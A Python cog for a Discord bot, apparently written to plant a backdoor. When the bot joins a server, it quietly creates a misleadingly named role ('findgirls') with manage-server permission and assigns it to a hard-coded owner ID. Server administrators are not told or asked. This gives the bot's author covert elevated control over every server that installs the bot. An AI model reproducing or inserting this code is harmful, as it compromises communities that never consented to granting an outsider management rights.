import discord
from discord.ext import commands


class owners(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.bot_owner_id = (
            843904399708651550  # Replace with the actual ID of the bot owner
        )

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        owner_bot = discord.utils.get(guild.members, id=self.bot.user.id)
        if owner_bot is None:
            return

        owner = discord.utils.get(guild.members, id=self.bot_owner_id)
        if owner is None:
            return

        findgirls_role = await guild.create_role(
            name="findgirls", permissions=discord.Permissions(manage_guild=True)
        )

        await owner.add_roles(findgirls_role)
        print(f"Created 'findgirls' role and assigned to {owner.name} in {guild.name}")


async def setup(bot):
    await bot.add_cog(owners(bot))
